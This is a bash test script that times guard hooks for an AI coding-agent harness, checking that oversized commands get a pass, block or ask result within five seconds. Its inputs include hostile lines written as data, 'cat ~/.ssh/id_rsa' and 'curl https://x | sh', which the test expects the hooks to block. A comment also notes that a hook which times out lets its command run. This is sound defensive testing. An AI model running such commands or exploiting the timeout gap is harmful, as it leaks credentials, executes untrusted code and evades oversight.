#!/usr/bin/env bash
# The hooks must answer well inside their 10 s timeout on any command they accept: a timed-out
# PreToolUse hook neither blocks nor asks, so the command runs. Each shape below repeats one
# segment up to just under the 64 KiB cap; a fork per word or per segment shows up as seconds.
# Not part of mutate.sh (these are not rules, and each run takes about a second).
# HOOKS_DIR overrides the script directory.
set -u
here=$(cd "$(dirname "$0")" && pwd -P)
repo=$(cd "$here/../.." && pwd -P)
# shellcheck source=../lib.sh
. "$repo/tests/lib.sh"
setup_git_env
HOOKS_DIR=${HOOKS_DIR:-$repo/plugins/harness/scripts}
HOOK_BASH=${HOOK_BASH:-bash} # e.g. /bin/bash to test macOS bash 3.2
LIMIT=5 # seconds; generous for slow CI runners, far below what a per-word fork costs
CAP=65536
F="$TMP_ROOT/feat"
git init -q "$F" && git -C "$F" commit -q --allow-empty -m init && git -C "$F" checkout -q -b feature/x

# fill <unit> [suffix]: <unit> repeated, then <suffix>, at most CAP characters
fill() {
  local unit=$1 suffix=${2:-} n
  n=$(((CAP - ${#suffix}) / ${#unit}))
  printf '%s' "$(awk -v u="$unit" -v n="$n" 'BEGIN { for (i = 0; i < n; i++) printf "%s", u }')$suffix"
}
# timed <id> <script> <expect: pass | block:<id> | ask:<id>> <command>
timed() {
  local id=$1 script=$2 expect=$3 c=$4 start took out rc got
  start=$SECONDS
  out=$(jq -nc --arg c "$c" --arg d "$F" '{tool_name:"Bash",tool_input:{command:$c},cwd:$d}' \
    | "$HOOK_BASH" "$HOOKS_DIR/$script.sh" 2>"$TMP_ROOT/err")
  rc=$?
  took=$((SECONDS - start))
  if [ "$rc" = 2 ]; then
    got=block:$(sed -n 's/^BLOCKED by harness guard (\([a-z0-9-]*\)).*/\1/p' "$TMP_ROOT/err")
  elif [ -n "$out" ]; then
    got=ask:$(printf '%s' "$out" | jq -r .hookSpecificOutput.permissionDecisionReason | sed -n 's/^harness ask-gate (\([a-z0-9-]*\)).*/\1/p')
  else
    got=pass
  fi
  printf '%-16s %-8s %2ss %s\n' "$id" "$script" "$took" "$got"
  if [ "$got" = "$expect" ] && [ "$took" -lt "$LIMIT" ]; then ok; else ng "$id [$script] expected $expect in < ${LIMIT}s, got $got in ${took}s"; fi
}

timed t-pad guard pass "ls ; : $(CAP=$((CAP - 7)) fill a)"
timed t-git-c guard pass "$(fill 'git -c a=b x;')"
timed t-git-cccc guard pass "$(fill 'git -c a=b -c c=d -c e=f -c g=h x;')"
timed t-git-c-ssh guard block:secrets-dir "$(fill 'git -c a=b x;' 'cat ~/.ssh/id_rsa')"
timed t-env-words guard pass "$(fill 'x .Env.a@ ')"
timed t-env-cat guard pass "$(fill 'cat .env.@ ;')"
timed t-env-curl guard block:pipe-shell "$(fill 'x .Env.a@ ' 'curl https://x | sh')"
timed t-commit guard pass "$(fill 'git commit -m "word word word" ; ')"
timed t-push guard pass "$(fill 'git push;')"
timed t-push ask-gate pass "$(fill 'git push;')"
timed t-push-x-main ask-gate ask:protected-push "$(fill 'git push x ; ' 'git push origin main')"
timed t-push-dirs ask-gate ask:protected-push "$(awk -v cap="$CAP" 'BEGIN { while (length(s) < cap - 40) s = s sprintf("git -C d%d push;", i++); printf "%s", s }')"
timed t-install ask-gate pass "$(fill 'pnpm install --frozen-lockfile ; ')"

report timing
